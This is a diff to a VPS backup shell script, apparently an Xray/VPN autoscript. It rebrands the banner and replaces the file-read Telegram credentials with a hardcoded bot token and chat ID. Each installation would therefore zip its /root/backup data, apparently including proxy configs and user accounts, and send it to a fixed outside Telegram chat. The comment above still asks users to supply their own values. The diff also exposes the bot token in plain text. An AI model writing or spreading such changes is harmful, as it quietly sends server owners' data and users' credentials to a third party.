@@ -26,7 +26,7 @@ ttxtls=$(grep -c -E "^### $user" "/usr/local/etc/xray/config.json")
 Total_User=$(($tvless + $ttxtls))
 
 clear
-echo " VPS Data Backup By YOLONET "
+echo " VPS Data Backup By khaiVPN "
 sleep 1
 echo -e "[ ${green}INFO${NC} ] Processing . . . "
 mkdir -p /root/backup
@@ -44,8 +44,8 @@ zip_filename="backup-$domain.zip"
 zip -r $zip_filename /root/backup > /dev/null 2>&1
 
 # Replace the following values with your own Telegram bot token and chat ID
-TELEGRAM_BOT_TOKEN=$(cat /root/yoloautosc/tele_token.txt)
-TELEGRAM_CHAT_ID=$(cat /root/yoloautosc/tele_id.txt)
+TELEGRAM_BOT_TOKEN=7449633234:AAEqUHsYNL74U_6mtadoTITPmKNV2Fwfds4
+TELEGRAM_CHAT_ID=5047657342
 
 # Use the following URL to send a file to Telegram using the bot API
 TELEGRAM_API_URL="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument"
